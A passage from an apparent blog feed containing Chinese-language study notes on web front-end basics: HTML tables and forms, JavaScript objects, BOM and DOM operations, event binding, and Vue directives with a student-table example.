class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除索引</span></span><br><span class="line"><span class="keyword">show</span> index <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240731113654735.png" alt="image-20240731113654735"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;MySQL&quot;&gt;&lt;a href=&quot;#MySQL&quot; class=&quot;headerlink&quot; title=&quot;MySQL&quot;&gt;&lt;/a&gt;MySQL&lt;/h1&gt;&lt;p&gt;分类&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2024/07/23/MySQL/image-2</summary>
      
    
    
    
    <category term="MySQL" scheme="https://1xueyu1.github.io/categories/MySQL/"/>
    
    
  </entry>
  
  <entry>
    <title>web开发</title>
    <link href="https://1xueyu1.github.io/2024/07/17/web%E5%BC%80%E5%8F%91/"/>
    <id>https://1xueyu1.github.io/2024/07/17/web%E5%BC%80%E5%8F%91/</id>
    <published>2024-07-17T07:16:05.000Z</published>
    <updated>2024-08-12T04:04:09.921Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="web前端"><a href="#web前端" class="headerlink" title="web前端"></a>web前端</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span>定义表格</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span>表格中的行</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">th</span>&gt;</span></span>表头单元格</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span>普通单元格</span><br></pre></td></tr></table></figure><h3 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表单标签:<span class="language-xml"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span></span><br><span class="line">表单属性:</span><br><span class="line"><span class="code">action:表单数据提交的url地址</span></span><br><span class="line"><span class="code">method:表单提交方式</span></span><br><span class="line"><span class="code">get:表单数据拼接再url后面，?username=java, 大小有限制</span></span><br><span class="line"><span class="code">post:表单数据在请求体中携带，大小无限制</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">注意：表单项必须有name属性才可以提交</span><br></pre></td></tr></table></figure><h4 id="表单项标签"><a href="#表单项标签" class="headerlink" title="表单项标签"></a>表单项标签</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span>的type属性：text, password, radio, checkbox, file, date, datetime-local, time, number, hidden, button, submit</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span>定义下拉列表</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span>定义文本域</span><br></pre></td></tr></table></figure><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p><strong>输出语句</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">// 浏览器弹出警告框</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;hello wordld&quot;</span>);<span class="comment">// 写入HTML，在浏览器展示</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">// 写入浏览器控制台</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><h5 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">true</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 属性</span></span><br><span class="line"><span class="comment"> * length, 返回数组中元素的数量</span></span><br><span class="line"><span class="comment"> * 方法</span></span><br><span class="line"><span class="comment"> *forEach()便利每个元素，并调用一次传入的函数</span></span><br><span class="line"><span class="comment"> *push()添加新元素到末尾，返回新的长度</span></span><br><span class="line"><span class="comment"> *  splice()删除元素</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="String"><a href="#String" class="headerlink" title="String"></a>String</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">length </span></span><br><span class="line"><span class="comment">方法：</span></span><br><span class="line"><span class="comment">charAt()返回指定位置的字符</span></span><br><span class="line"><span class="comment">indexOf()检索字符串</span></span><br><span class="line"><span class="comment">trim()去除字符串两边的空格</span></span><br><span class="line"><span class="comment">substring()提取字符串两个指定的索引号之间的字符</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义格式</span></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;TOM&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">20</span>,</span><br><span class="line">    <span class="attr">gender</span>:<span class="string">&quot;male&quot;</span>,</span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;恰饭&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用格式</span></span><br><span class="line">object.<span class="property">attribute</span>;</span><br><span class="line">object.<span class="keyword">function</span>(<span class="params"></span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JSON字符串转化为JS对象</span></span><br><span class="line"><span class="keyword">var</span> jsObject = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(userStr);</span><br><span class="line"><span class="comment">// JS对象转为JSON字符串</span></span><br><span class="line"><span class="keyword">var</span> jsonStr = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(jsObject);</span><br></pre></td></tr></table></figure><h5 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h5><p><strong>window</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// confirm - 对话框</span></span><br><span class="line"><span class="keyword">var</span> flag = <span class="title function_">confirm</span>(<span class="string">&quot;你确认吗？&quot;</span>)；</span><br><span class="line"><span class="title function_">alert</span>(flag)<span class="comment">// true or false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时器 - setInterval() -- 周期性的执行某个函数</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">i++;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;定时器执行了&quot;</span> + i + <span class="string">&quot;次&quot;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时器 - setTimeout -- 延迟指定实践执行一次</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;延迟3秒&quot;</span>);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p><strong>location</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(location.<span class="property">href</span>)</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br></pre></td></tr></table></figure><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>5个对象:Document, Element, Attribute, Text, Comment(注释对象)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Element元素对象的函数</span></span><br><span class="line"><span class="comment">// 根据idu获取单个Element对象</span></span><br><span class="line"><span class="keyword">var</span> h1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;h1&#x27;</span>);</span><br><span class="line"><span class="comment">// 标签名称获取数组</span></span><br><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="comment">// name属性值获取数组</span></span><br><span class="line"><span class="keyword">var</span> hobbys = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;hobby&#x27;</span>);</span><br><span class="line"><span class="comment">// class属性值获取数组</span></span><br><span class="line"><span class="keyword">var</span> clss = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询参考手册，属性、方法</span></span><br><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> div1 = divs[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">// 修改元素内容</span></span><br><span class="line">    div1.<span class="property">innerHTML</span> = <span class="string">&quot;Welcome to my world&quot;</span></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;h1&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&quot;./img/wallhaven-5gl1y1.png&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &lt;font color=&#x27;red&#x27;&gt;&lt;/font&gt;</span></span><br><span class="line">    <span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; divs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        divs[i].<span class="property">innerHTML</span> += <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;very good&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ins = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;hobby&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; ins.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 选中状态</span></span><br><span class="line">        ins[i].<span class="property">checked</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="JS事件监听"><a href="#JS事件监听" class="headerlink" title="JS事件监听"></a>JS事件监听</h4><h5 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h5><p><strong>通过HTML标签中的事件属性进行绑定</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;btn1&quot;</span> value=<span class="string">&quot;事件绑定1&quot;</span> onclick=<span class="string">&quot;on()&quot;</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">on</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;btn1 被点击了&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过DOM元素属性绑定</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn2&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;btn2 被点击了&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="常见事件"><a href="#常见事件" class="headerlink" title="常见事件"></a>常见事件</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onclick鼠标单击事件</span><br><span class="line">onblur元素失去焦点</span><br><span class="line">onfocus元素获得焦点</span><br><span class="line">onload某个页面或图像被完全加载</span><br><span class="line">onsubmit表单提交时出发该事件</span><br><span class="line">onkeydown键盘按键</span><br><span class="line">onmouseover鼠标移到某元素上</span><br><span class="line">onmouseout鼠标从某元素移开</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/r.asp">https://www.w3school.com.cn/r.asp</a></p><h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2><p>一套前端框架，免除JavaScript中的DOM操作，简化书写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入Vue.js文件</span></span><br><span class="line">&lt;script src=<span class="string">&quot;./js/vue.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在JS代码区域，创建Vue核心对象， 定义数据模型</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span> (&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,     <span class="comment">// vue接管区域</span></span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&quot;Hello Vue&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写视图</span></span><br><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;&#123;message&#125;&#125;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><table><thead><tr><th align="center">v-bind</th><th>绑定属性值， 如设置href, css</th></tr></thead><tbody><tr><td align="center">v-model</td><td>为表单元素创建双向数据绑定</td></tr><tr><td align="center">v-on</td><td>绑定事件</td></tr><tr><td align="center">v-if, v-else-if, v-else</td><td></td></tr><tr><td align="center">v-show</td><td></td></tr><tr><td align="center">v-for</td><td></td></tr></tbody></table><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// v-bind绑定属性值， 如设置href, css</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span>百度<span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">// v-model 为表单元素创建双向数据绑定</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">// v-on绑定事件</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击事件&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;handle(str)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击事件&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;handle(str)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="code">    new Vue(&#123;</span></span><br><span class="line"><span class="code">        el: &quot;#app&quot;,</span></span><br><span class="line"><span class="code">        data:&#123;</span></span><br><span class="line"><span class="code">            str : &quot;我被点击了~&quot;</span></span><br><span class="line"><span class="code">        &#125;,</span></span><br><span class="line"><span class="code">        methods: &#123;</span></span><br><span class="line"><span class="code">            handle: function (str) &#123;</span></span><br><span class="line"><span class="code">                alert(str)</span></span><br><span class="line"><span class="code">            &#125;</span></span><br><span class="line"><span class="code">        &#125;</span></span><br><span class="line"><span class="code">    &#125;)</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code">// v-if, v-else-if, v-else</span></span><br><span class="line"><span class="code">&lt;span v-if=&quot;age &lt; 35&quot;&gt;年轻人&lt;/span&gt;</span></span><br><span class="line"><span class="code">&lt;span v-else-if=&quot;age &gt;= 35 &amp;&amp; age &lt;= 60&quot;&gt;中年人&lt;/span&gt;</span></span><br><span class="line"><span class="code">&lt;span v-else&gt;老年人&lt;/span&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">// v-show</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-show</span>=<span class="string">&quot;age &lt; 35&quot;</span>&gt;</span></span>年轻人<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-show</span>=<span class="string">&quot;age &gt;</span></span></span>= 35 &amp;&amp; age &lt;= 60&quot;&gt;中年人<span class="language-xml"><span class="tag"><span class="string">&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="tag"><span class="string">&lt;span v-show=&quot;</span><span class="attr">age</span> &gt;</span></span> 60&quot;&gt;老年人<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">// v-for</span><br><span class="line">// cities:[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;]</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;(city, index) in cities&quot;</span>&gt;</span></span>第&#123;&#123;index + 1&#125;&#125;个城市是&#123;&#123;city&#125;&#125;<span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>案例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;%60&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>成绩<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>等级<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;(user, index) in users&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;index + 1&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.name&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.age&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;user.gender == 1&quot;</span>&gt;</span>male<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;user.gender == 2&quot;</span>&gt;</span>female<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.score&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;user.score &gt;= 85&quot;</span>&gt;</span>优秀<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">&quot;user.score &gt;= 60&quot;</span>&gt;</span>及格<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span>不及格<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 定义Vue对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">users</span>: [ &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>:<span class="string">&quot;tom&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>:<span class="number">20</span>, </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">gender</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">score</span>:<span class="number">78</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>:<span class="string">&quot;bob&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>:<span 